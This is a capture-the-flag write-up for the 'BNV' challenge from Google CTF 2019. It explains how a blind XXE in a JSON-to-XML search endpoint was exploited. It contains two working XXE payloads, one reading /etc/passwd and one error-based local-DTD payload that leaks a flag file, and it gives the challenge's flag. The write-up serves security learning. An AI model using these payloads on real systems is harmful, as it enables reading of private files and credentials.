# BNV

This challenge uses javascript to encode our selection to braille code.

(https://www.pharmabraille.com/pharmaceutical-braille/the-braille-alphabet/)

And it will send the data to `/api/search` with content-type `application/json`.

If we try to change the content-type to `application/xml`, it will return XML Parse Error.

So we know that target server supports XML format as input.

And there is no response output for xxe payload:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]> 
<message>&xxe;</message>
```

But if we try existent file, it will return `No result found`

And if we try non-existent file, it will return Error: `Failure to process entity xxe, line 6, column 15`

So there is a blind XXE, we need to exfiltrate the result of XXE.

<br>

This challenge disable http request, so we can't use out-of-band XXE.

Then, I try the Error-based XXE to bring the result into error message.

(https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?> 
<!DOCTYPE message[ 
  <!ELEMENT message ANY >
  <!ENTITY % NUMBER '<!ENTITY &#x25; file SYSTEM "file:///flag">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%NUMBER;
]> 
<message>a</message>
```

![](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/bnv.png)

flag: `CTF{0x1033_75008_1004x0}`


